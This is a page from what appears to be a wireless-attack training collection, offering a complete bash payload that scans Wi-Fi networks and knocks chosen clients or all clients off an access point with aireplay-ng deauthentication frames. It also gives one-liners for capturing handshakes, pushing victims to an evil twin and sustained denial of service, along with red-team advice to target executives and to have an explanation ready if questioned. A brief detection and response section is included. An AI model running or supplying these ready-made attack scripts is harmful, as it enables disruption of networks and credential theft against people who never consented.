# PP-I08: Client Deauth

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I08 |
| **Name** | Client Deauth |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Targeted client disconnection |
| **MITRE ATT&CK** | T1498 (Network Denial of Service) |

## What This Payload Does

Performs targeted deauthentication of specific clients, forcing them to reconnect. More surgical than broadcast deauth, useful for specific target manipulation.

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I08
# Name: Client Deauth
# Description: Targeted client disconnection
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
TARGET_AP=""
TARGET_CLIENT=""
DEAUTH_MODE="targeted"  # targeted, all, continuous

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-i08.log"
CLIENT_LOG="/sd/loot/deauth/clients.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Stopping deauth..."
    pkill -f aireplay-ng 2>/dev/null
    pkill -f airodump-ng 2>/dev/null
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# FUNCTIONS
# ============================================

# Find all clients on target AP
find_clients() {
    local ap_bssid="$1"
    local channel="$2"
    local scan_time="${3:-15}"

    log "Scanning for clients on $ap_bssid..."

    timeout $scan_time airodump-ng \
        --bssid "$ap_bssid" \
        -c "$channel" \
        -w /tmp/client_scan \
        -o csv \
        "$MON_INTERFACE" 2>/dev/null &

    sleep $scan_time
    pkill -f airodump-ng 2>/dev/null

    # Parse clients from CSV
    if [ -f /tmp/client_scan-01.csv ]; then
        # Find line with "Station MAC"
        CLIENT_LINE=$(grep -n "Station MAC" /tmp/client_scan-01.csv | cut -d: -f1)

        if [ -n "$CLIENT_LINE" ]; then
            tail -n +$((CLIENT_LINE + 1)) /tmp/client_scan-01.csv | \
                awk -F',' '$6 ~ /'"$ap_bssid"'/ {print $1}' | \
                tr -d ' ' | \
                grep -E "^[0-9A-Fa-f:]+$"
        fi
    fi

    rm -f /tmp/client_scan* 2>/dev/null
}

# Deauth single client
deauth_client() {
    local ap="$1"
    local client="$2"
    local count="${3:-5}"

    log "Deauthing $client from $ap"

    aireplay-ng --deauth "$count" \
        -a "$ap" \
        -c "$client" \
        "$MON_INTERFACE"
}

# Deauth all clients
deauth_all() {
    local ap="$1"
    local count="${2:-5}"

    log "Broadcast deauth on $ap"

    aireplay-ng --deauth "$count" \
        -a "$ap" \
        "$MON_INTERFACE"
}

# Continuous deauth
deauth_continuous() {
    local ap="$1"
    local client="$2"
    local interval="${3:-10}"

    log "Continuous deauth: $client from $ap (interval: ${interval}s)"

    while true; do
        if [ -n "$client" ]; then
            aireplay-ng --deauth 3 -a "$ap" -c "$client" "$MON_INTERFACE" 2>/dev/null
        else
            aireplay-ng --deauth 3 -a "$ap" "$MON_INTERFACE" 2>/dev/null
        fi
        sleep $interval
    done
}

# ============================================
# MAIN
# ============================================
log "Starting PP-I08: Client Deauth"

mkdir -p "$(dirname $CLIENT_LOG)"

# Enable monitor mode
airmon-ng check kill 2>/dev/null
airmon-ng start "$INTERFACE" 2>/dev/null

if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}mon"
else
    MON_INTERFACE="${INTERFACE}"
fi

# Interactive mode if no targets specified
if [ -z "$TARGET_AP" ]; then
    echo ""
    echo "╔════════════════════════════════════════════════════╗"
    echo "║         CLIENT DEAUTHENTICATION                    ║"
    echo "╚════════════════════════════════════════════════════╝"
    echo ""

    # Scan for networks
    echo "Scanning for networks..."
    timeout 10 airodump-ng -w /tmp/scan -o csv "$MON_INTERFACE" 2>/dev/null &
    sleep 10
    pkill airodump-ng 2>/dev/null

    echo ""
    echo "Available networks:"
    echo "─────────────────────────────────────────"
    printf "%-4s %-18s %-5s %-20s\n" "Num" "BSSID" "CH" "SSID"
    echo "─────────────────────────────────────────"

    NETWORKS=()
    i=1
    while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lanip idlen essid key; do
        bssid=$(echo "$bssid" | tr -d ' ')
        if [[ "$bssid" =~ ^[0-9A-Fa-f:]+$ ]]; then
            channel=$(echo "$channel" | tr -d ' ')
            essid=$(echo "$essid" | tr -d ' ')
            printf "%-4s %-18s %-5s %-20s\n" "$i" "$bssid" "$channel" "$essid"
            NETWORKS+=("$bssid:$channel")
            ((i++))
        fi
    done < /tmp/scan-01.csv

    echo ""
    read -p "Select network number: " NET_NUM

    IFS=':' read -r TARGET_AP TARGET_CHANNEL <<< "${NETWORKS[$((NET_NUM-1))]}"

    if [ -z "$TARGET_AP" ]; then
        log "Invalid selection"
        exit 1
    fi

    # Find clients
    echo ""
    echo "Finding clients on $TARGET_AP..."

    CLIENTS=($(find_clients "$TARGET_AP" "$TARGET_CHANNEL" 20))

    if [ ${#CLIENTS[@]} -eq 0 ]; then
        echo "No clients found. Using broadcast deauth."
        TARGET_CLIENT=""
    else
        echo ""
        echo "Connected clients:"
        echo "─────────────────────────────────────────"
        printf "%-4s %-18s\n" "Num" "Client MAC"
        echo "─────────────────────────────────────────"
        echo "0    [Broadcast - All Clients]"

        i=1
        for client in "${CLIENTS[@]}"; do
            printf "%-4s %-18s\n" "$i" "$client"
            ((i++))
        done

        echo ""
        read -p "Select client (0 for all): " CLIENT_NUM

        if [ "$CLIENT_NUM" -gt 0 ]; then
            TARGET_CLIENT="${CLIENTS[$((CLIENT_NUM-1))]}"
        fi
    fi
fi

# Set channel
iwconfig "$MON_INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null

echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║         DEAUTH CONFIGURATION                       ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  AP:     $TARGET_AP"
echo "║  Client: ${TARGET_CLIENT:-Broadcast}"
echo "║  Channel: $TARGET_CHANNEL"
echo "╚════════════════════════════════════════════════════╝"
echo ""
echo "Select mode:"
echo "  1. Single burst (5 packets)"
echo "  2. Heavy burst (50 packets)"
echo "  3. Continuous (until stopped)"
echo ""
read -p "Mode [1-3]: " MODE

case $MODE in
    1)
        if [ -n "$TARGET_CLIENT" ]; then
            deauth_client "$TARGET_AP" "$TARGET_CLIENT" 5
        else
            deauth_all "$TARGET_AP" 5
        fi
        ;;
    2)
        if [ -n "$TARGET_CLIENT" ]; then
            deauth_client "$TARGET_AP" "$TARGET_CLIENT" 50
        else
            deauth_all "$TARGET_AP" 50
        fi
        ;;
    3)
        echo "Press Ctrl+C to stop"
        deauth_continuous "$TARGET_AP" "$TARGET_CLIENT" 5
        ;;
    *)
        deauth_client "$TARGET_AP" "$TARGET_CLIENT" 5
        ;;
esac

log "Deauth complete"
cleanup
```

---

## Use Cases

### Force Handshake Capture
```bash
# Deauth to capture reconnection handshake
aireplay-ng --deauth 5 -a $AP -c $CLIENT wlan1mon
# Client reconnects, handshake captured
```

### Push to Evil Twin
```bash
# Deauth from real AP continuously
aireplay-ng --deauth 0 -a $REAL_AP wlan1mon &
# Evil Twin running with same SSID
# Client connects to Evil Twin instead
```

### Denial of Service
```bash
# Prevent specific client from connecting
while true; do
    aireplay-ng --deauth 5 -a $AP -c $TARGET wlan1mon
    sleep 2
done
```

### Selective Disconnection
```bash
# Keep VIPs connected, disconnect others
WHITELIST=("AA:BB:CC:DD:EE:FF" "11:22:33:44:55:66")
for client in $(find_clients); do
    if [[ ! " ${WHITELIST[@]} " =~ " ${client} " ]]; then
        aireplay-ng --deauth 5 -a $AP -c $client wlan1mon
    fi
done
```

---

## Red Team Perspective

### Strategic Deauth
- **Timing**: During important meetings/calls
- **Targeting**: Focus on executives, IT staff
- **Stealth**: Brief bursts, not continuous
- **Purpose**: Force to Evil Twin or capture handshake

### OPSEC
- Continuous deauth is VERY detectable
- Use minimum necessary packets
- Vary timing randomly
- Have explanation ready if questioned

---

## Blue Team Perspective

### Detection
```yaml
title: Wireless Deauth Attack Detection
description: Detects deauth attack patterns
detection:
    selection:
        type: deauth_frame
        count_per_minute: '>10'
    condition: selection
```

### Response
1. Identify source of deauth frames
2. Alert security team
3. Consider switching to 802.11w (PMF)
4. Locate rogue device physically

---

## Payload File

Save as `PP-I08_Client_Deauth.sh`:

```bash
#!/bin/bash
# PP-I08: Client Deauth (Compact)
AP="${1:?Usage: $0 AP_BSSID [CLIENT_MAC] [COUNT]}"
CLIENT="$2"
COUNT="${3:-5}"
airmon-ng start wlan1 2>/dev/null
if [ -n "$CLIENT" ]; then
    aireplay-ng --deauth $COUNT -a $AP -c $CLIENT wlan1mon
else
    aireplay-ng --deauth $COUNT -a $AP wlan1mon
fi
```

---

[← PP-I07 WPA Handshake](PP-I07_WPA_Handshake.md) | [Back to Intermediate](README.md) | [Next: PP-I09 Traffic Capture →](PP-I09_Traffic_Capture.md)
